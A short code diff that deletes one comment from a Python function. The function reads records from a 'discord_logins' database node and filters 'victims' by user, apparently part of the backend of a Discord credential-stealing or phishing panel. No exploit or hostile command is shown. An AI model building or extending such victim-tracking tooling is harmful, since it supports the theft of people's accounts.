@@ -191,7 +191,6 @@ def handle_auth(db, auth):
             time.sleep(2)
 
 def print_user_stats(db, user_id):
-    # Get all victims and filter client-side
     victims_ref = db.child("discord_logins").get()
     if victims_ref.val():
         # Filter victims that belong to this user
